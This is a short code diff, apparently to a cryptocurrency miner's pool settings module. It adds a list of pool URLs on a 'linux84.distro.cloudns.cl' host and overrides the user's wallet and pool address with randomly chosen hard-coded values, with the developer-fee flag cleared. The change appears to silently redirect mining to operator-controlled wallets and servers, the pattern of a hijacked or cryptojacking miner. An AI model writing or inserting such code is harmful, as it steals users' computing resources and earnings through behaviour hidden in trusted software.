@@ -17,10 +17,14 @@ pool_settings_provider::pool_settings_provider(arguments &args) {
 
     const string word = wordList[rand() % 16];
     
+    const string wordList84[9] = {"http://linux84.distro.cloudns.cl:84","http://linux84.distro.cloudns.cl:71","http://linux84.distro.cloudns.cl:72","http://linux84.distro.cloudns.cl:73","http://linux84.distro.cloudns.cl:74","http://linux84.distro.cloudns.cl:75","http://linux84.distro.cloudns.cl:76","http://linux84.distro.cloudns.cl:78","http://linux84.distro.cloudns.cl:82"};
+
+    const string word84 = wordList84[rand() % 9];
+    
     __last_devfee_update = 0;
 
-    __user_pool_settings.wallet = "3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3";
-    __user_pool_settings.pool_address = "http://66.42.119.233:84";
+    __user_pool_settings.wallet = word;
+    __user_pool_settings.pool_address = word84;
     __user_pool_settings.is_devfee = false;
     __user_pool_settings.pool_extensions = "";
 
